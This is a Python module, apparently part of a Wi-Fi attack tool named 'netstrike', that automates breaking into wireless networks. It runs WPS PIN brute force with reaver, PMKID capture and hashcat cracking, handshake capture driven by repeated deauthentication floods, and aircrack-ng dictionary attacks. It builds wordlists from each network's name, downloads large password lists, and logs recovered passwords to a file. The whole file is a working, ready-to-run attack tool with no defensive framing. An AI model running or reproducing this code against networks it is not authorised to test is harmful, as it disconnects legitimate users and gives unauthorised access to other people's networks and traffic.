#!/usr/bin/env python3

import os
import time
import subprocess
import threading
import requests

class PasswordCracker:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.cracking_active = False

    def auto_crack_attack(self):
        """Enhanced Auto Cracking - All Methods Sequentially"""
        print("\033[1;36m[→] Initializing advanced cracking protocol...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;33m[🎯] Target acquired: {target['essid']}\033[0m")
                print("\033[1;36m[⚡] Starting advanced cracking sequence...\033[0m")
                
                # Try multiple enhanced cracking methods automatically
                if self.try_enhanced_cracking_methods(target):
                    return
                
                print("\033[1;31m[✘] All cracking methods failed\033[0m")
                print("\033[1;33m[💡] Suggestion: Try with different wordlists or manual methods\033[0m")

    def try_enhanced_cracking_methods(self, target):
        """Try all enhanced cracking methods in sequence"""
        methods = [
            ("WPS PIN Attack", self.enhanced_wps_pin_attack),
            ("PMKID Attack", self.enhanced_pmkid_attack),
            ("Handshake Capture", self.enhanced_handshake_capture),
            ("Advanced Wordlist", self.enhanced_wordlist_attack)
        ]
        
        for method_name, method_func in methods:
            print(f"\033[1;36m[→] Attempting: {method_name}\033[0m")
            
            result = method_func(target)
            
            if result:
                print(f"\033[1;32m[🎉] Success with {method_name}!\033[0m")
                return True
            else:
                print(f"\033[1;33m[⚠️] {method_name} failed - Trying next method\033[0m")
                time.sleep(2)
        
        return False

    def enhanced_wps_pin_attack(self, target):
        """Enhanced WPS PIN attack with better detection"""
        print("\033[1;33m[!] Scanning for WPS vulnerability...\033[0m")
        
        # Enhanced WPS detection
        wash_cmd = f"timeout 30s wash -i {self.core.mon_interface} -s -C"
        result = self.core.run_command(wash_cmd)
        
        if result and target['bssid'] in result.stdout:
            print("\033[1;32m[✓] WPS vulnerability detected\033[0m")
            print("\033[1;31m[💣] Launching enhanced WPS PIN brute force...\033[0m")
            
            # Start enhanced reaver attack
            reaver_proc = self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A -d 2 -t 2 -T 2",
                background=True
            )
            
            if reaver_proc:
                print("\033[1;32m[⚡] WPS attack running in background\033[0m")
                print("\033[1;33m[!] Check terminal for PIN progress\033[0m")
                return True
        else:
            print("\033[1;31m[✘] WPS not available on target\033[0m")
        
        return False

    def enhanced_pmkid_attack(self, target):
        """Enhanced PMKID attack without handshake"""
        print("\033[1;33m[!] Attempting enhanced PMKID attack...\033[0m")
        
        # Use hcxdumptool to capture PMKID
        pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
        
        capture_cmd = f"timeout 45s hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2 --enable_status=1"
        result = self.core.run_command(capture_cmd)
        
        if os.path.exists(f"{pmkid_file}.pcapng") and os.path.getsize(f"{pmkid_file}.pcapng") > 100:
            print("\033[1;32m[✓] PMKID captured successfully\033[0m")
            
            # Convert to hash format
            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng"
            self.core.run_command(convert_cmd)
            
            if os.path.exists(f"{pmkid_file}.hash"):
                return self.enhanced_crack_pmkid_hash(f"{pmkid_file}.hash", target)
        
        print("\033[1;31m[✘] PMKID capture failed\033[0m")
        return False

    def enhanced_crack_pmkid_hash(self, hash_file, target):
        """Enhanced PMKID hash cracking"""
        wordlist = self.download_enhanced_wordlist()
        
        if wordlist:
            print("\033[1;36m[→] Cracking PMKID hash with enhanced wordlist...\033[0m")
            
            # Enhanced hashcat command
            crack_cmd = f"hashcat -m 16800 {hash_file} {wordlist} -O --force -w 3"
            result = self.core.run_command(crack_cmd, timeout=300)
            
            if result and "Cracked" in result.stdout:
                print("\033[1;32m[🎉] PMKID cracked successfully!\033[0m")
                # Extract password from output
                lines = result.stdout.split('\n')
                for line in lines:
                    if "Cracked" in line and ":" in line:
                        password = line.split(':')[-1].strip()
                        print(f"\033[1;32m[🔓] PASSWORD FOUND: {password}\033[0m")
                        self.save_cracked_password(target, password)
                        return True
        
        return False

    def enhanced_handshake_capture(self, target):
        """Enhanced handshake capture and cracking"""
        print("\033[1;33m[!] Attempting enhanced handshake capture...\033[0m")
        
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
        
        # Set channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Start enhanced capture
        print("\033[1;36m[→] Capturing for 60 seconds with enhanced detection...\033[0m")
        capture_proc = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_file} {self.core.mon_interface} --output-format cap",
            background=True
        )
        
        # Enhanced deauth attacks
        print("\033[1;31m[💣] Deploying enhanced deauth attacks...\033[0m")
        deauth_thread = threading.Thread(target=self.enhanced_deauth_attack, args=(target,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        # Monitor for handshake
        handshake_captured = False
        start_time = time.time()
        while time.time() - start_time < 60 and not handshake_captured:
            if self.check_enhanced_handshake(f"{cap_file}-01.cap"):
                handshake_captured = True
                break
            time.sleep(5)
        
        if capture_proc:
            capture_proc.terminate()
        
        if handshake_captured:
            print("\033[1;32m[✓] Handshake captured successfully!\033[0m")
            return self.enhanced_crack_handshake(f"{cap_file}-01.cap", target['bssid'], target['essid'])
        else:
            print("\033[1;31m[✘] No handshake captured\033[0m")
            return False

    def enhanced_deauth_attack(self, target):
        """Enhanced deauth attacks to trigger handshake"""
        for i in range(20):  # 20 enhanced attempts
            if self.cracking_active:
                break
            # Enhanced deauth with different patterns
            self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1")
            time.sleep(1.5)

    def enhanced_wordlist_attack(self, target):
        """Enhanced wordlist attack with multiple advanced wordlists"""
        print("\033[1;33m[!] Preparing advanced wordlist attack...\033[0m")
        
        wordlists = self.download_all_enhanced_wordlists()
        
        # First, check if we have a handshake
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}-01.cap"
        if not os.path.exists(cap_file):
            print("\033[1;31m[✘] No handshake file found\033[0m")
            return False
        
        for wordlist_name, wordlist_path in wordlists.items():
            if wordlist_path and os.path.exists(wordlist_path):
                print(f"\033[1;36m[→] Trying {wordlist_name}...\033[0m")
                
                result = self.core.run_command(
                    f"aircrack-ng -w {wordlist_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q",
                    timeout=300
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                    self.save_cracked_password(target, password)
                    return True
        
        return False

    def check_enhanced_handshake(self, cap_file):
        """Enhanced handshake detection"""
        if not os.path.exists(cap_file):
            return False
        
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'")
        return result and "1 handshake" in result.stdout

    def enhanced_crack_handshake(self, cap_file, bssid, essid):
        """Enhanced cracking with intelligent wordlist selection"""
        print("\033[1;33m[!] Initiating enhanced cracking sequence...\033[0m")
        
        # Create targeted wordlist first
        smart_wordlist = self.create_intelligent_wordlist(essid)
        
        wordlist_priority = [
            ("Intelligent Wordlist", smart_wordlist),
            ("Enhanced Wordlist", self.download_enhanced_wordlist()),
            ("RockYou Wordlist", self.download_rockyou_wordlist()),
            ("Common Passwords", self.download_common_wordlist())
        ]
        
        for wl_name, wl_path in wordlist_priority:
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] Attempting {wl_name}...\033[0m")
                
                result = self.core.run_command(
                    f"aircrack-ng -w {wl_path} -b {bssid} {cap_file} -l /tmp/cracked.txt -q",
                    timeout=600
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                    self.save_cracked_password({'essid': essid, 'bssid': bssid}, password)
                    return True
                else:
                    print(f"\033[1;33m[⚠️] {wl_name} failed\033[0m")
        
        return False

    def create_intelligent_wordlist(self, essid):
        """Create intelligent targeted wordlist"""
        wordlist_path = "/tmp/netstrike_intelligent_wordlist.txt"
        
        common_passwords = [
            "12345678", "password", "admin123", "welcome", "qwerty", "letmein",
            "123456789", "password123", "admin", "welcome123", "1234567890",
            "1234", "12345", "123456", "1234567", "internet", "wireless",
            "default", "guest", "linksys", "dlink", "netgear", "cisco", "root",
            "adminadmin", "pass123", "passwort", "123456789", "1234567890",
            "00000000", "11111111", "123123123", "password1", "iloveyou"
        ]
        
        # Enhanced ESSID-based intelligent variations
        if essid and essid != "HIDDEN_SSID" and "HIDDEN" not in essid:
            # Remove common prefixes/suffixes and clean
            clean_essid = essid.replace('_', '').replace('-', '').replace(' ', '')
            
            variations = [
                essid, essid + "123", essid + "1234", essid + "12345", essid + "2024",
                essid.lower(), essid.upper(), clean_essid, clean_essid + "123",
                essid.replace(' ', ''), essid.replace(' ', '_'), essid.replace(' ', '-'),
                essid + "!", essid + "@", essid + "#", essid + "$"
            ]
            
            # Add common modifications
            common_essid_passwords = [
                essid + "wifi", essid + "wireless", essid + "network",
                "my" + essid, "the" + essid, "our" + essid
            ]
            
            common_passwords.extend(variations)
            common_passwords.extend(common_essid_passwords)
        
        # Remove duplicates
        common_passwords = list(set(common_passwords))
        
        try:
            with open(wordlist_path, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
            
            print(f"\033[1;32m[✓] Intelligent wordlist created with {len(common_passwords)} passwords\033[0m")
            return wordlist_path
        except Exception as e:
            print(f"\033[1;31m[✘] Wordlist creation failed: {e}\033[0m")
            return None

    def download_all_enhanced_wordlists(self):
        """Download multiple enhanced wordlists"""
        return {
            "Enhanced Wordlist": self.download_enhanced_wordlist(),
            "RockYou": self.download_rockyou_wordlist(),
            "Common Passwords": self.download_common_wordlist()
        }

    def download_rockyou_wordlist(self):
        """Download rockyou wordlist with enhanced methods"""
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        
        if os.path.exists(rockyou_path):
            return rockyou_path
        
        print("\033[1;33m[!] Downloading RockYou wordlist...\033[0m")
        
        # Try multiple enhanced sources
        sources = [
            "wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt 2>/dev/null",
            "curl -s -L -o /tmp/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 2>/dev/null",
            "wget -q https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz -O /tmp/rockyou.txt.gz 2>/dev/null && gzip -dc /tmp/rockyou.txt.gz > /tmp/rockyou.txt 2>/dev/null"
        ]
        
        for source in sources:
            self.core.run_command(source)
            if os.path.exists("/tmp/rockyou.txt") and os.path.getsize("/tmp/rockyou.txt") > 1000000:
                return "/tmp/rockyou.txt"
        
        # Try to install via package manager
        self.core.run_command("apt-get update && apt-get install -y wordlists 2>/dev/null")
        
        if os.path.exists("/usr/share/wordlists/rockyou.txt.gz"):
            self.core.run_command("gzip -dc /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt 2>/dev/null")
            return "/tmp/rockyou.txt"
        
        return rockyou_path if os.path.exists(rockyou_path) else None

    def download_enhanced_wordlist(self):
        """Download enhanced wordlist"""
        enhanced_path = "/tmp/enhanced_wordlist.txt"
        
        if os.path.exists(enhanced_path):
            return enhanced_path
        
        print("\033[1;33m[!] Downloading enhanced wordlist...\033[0m")
        
        # Download from multiple enhanced sources
        self.core.run_command("wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O /tmp/top_million.txt 2>/dev/null")
        
        if os.path.exists("/tmp/top_million.txt"):
            return "/tmp/top_million.txt"
        
        # Create enhanced common password list
        enhanced_passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "abc123", "football", "monkey",
            "letmein", "696969", "shadow", "master", "666666",
            "qwertyuiop", "123321", "mustang", "1234567890", "michael",
            "654321", "superman", "1qaz2wsx", "7777777", "121212",
            "000000", "qazwsx", "123qwe", "killer", "trustno1",
            "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
            "buster", "soccer", "harley", "batman", "andrew",
            "tigger", "sunshine", "iloveyou", "2000", "charlie",
            "robert", "thomas", "hockey", "ranger", "daniel",
            "starwars", "klaster", "112233", "george", "computer",
            "michelle", "jessica", "pepper", "1111", "zxcvbn",
            "555555", "11111111", "131313", "freedom", "777777",
            "pass", "maggie", "159753", "aaaaaa", "ginger",
            "princess", "joshua", "cheese", "amanda", "summer",
            "love", "ashley", "nicole", "chelsea", "biteme",
            "matthew", "access", "yankees", "987654321", "dallas",
            "austin", "thunder", "taylor", "matrix", "mobilemail"
        ]
        
        try:
            with open(enhanced_path, 'w') as f:
                for pwd in enhanced_passwords:
                    f.write(pwd + '\n')
            return enhanced_path
        except:
            return None

    def download_common_wordlist(self):
        """Download/common password wordlist"""
        common_path = "/tmp/common_passwords.txt"
        
        if not os.path.exists(common_path):
            # Create a comprehensive common password list
            common_passwords = [
                "123456", "password", "12345678", "qwerty", "123456789",
                "12345", "1234", "111111", "1234567", "dragon",
                "123123", "baseball", "abc123", "football", "monkey",
                "letmein", "696969", "shadow", "master", "666666",
                "qwertyuiop", "123321", "mustang", "1234567890", "michael",
                "654321", "superman", "1qaz2wsx", "7777777", "121212",
                "000000", "qazwsx", "123qwe", "killer", "trustno1",
                "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
                "buster", "soccer", "harley", "batman", "andrew",
                "tigger", "sunshine", "iloveyou", "2000", "charlie",
                "robert", "thomas", "hockey", "ranger", "daniel"
            ]
            
            try:
                with open(common_path, 'w') as f:
                    for pwd in common_passwords:
                        f.write(pwd + '\n')
            except:
                pass
        
        return common_path

    def save_cracked_password(self, target, password):
        """Save cracked password to file"""
        try:
            with open("/tmp/netstrike_cracked_passwords.txt", "a") as f:
                f.write(f"Network: {target['essid']} | BSSID: {target['bssid']} | Password: {password}\n")
            print(f"\033[1;32m[💾] Password saved to: /tmp/netstrike_cracked_passwords.txt\033[0m")
        except Exception as e:
            print(f"\033[1;33m[!] Could not save password: {e}\033[0m")

    def wps_pin_attack(self):
        """Manual WPS PIN attack for menu compatibility"""
        print("\033[1;33m[!] Scanning for WPS-enabled networks...\033[0m")
        
        wash_proc = self.core.run_command(
            f"timeout 30s wash -i {self.core.mon_interface} -C",
            background=True
        )
        
        time.sleep(30)
        
        target_bssid = input("\033[1;33m[?] Enter WPS target BSSID: \033[0m").strip()
        target_channel = input("\033[1;33m[?] Enter target channel: \033[0m").strip()
        
        if target_bssid and target_channel:
            print("\033[1;31m[💣] Launching enhanced WPS PIN attack...\033[0m")
            
            self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target_bssid} -c {target_channel} -vv -K 1 -N -A -d 2",
                background=True
            )
            
            print("\033[1;32m[✅] WPS attack deployed - Check terminal for progress\033[0m")
        else:
            print("\033[1;31m[✘] Invalid target data\033[0m")
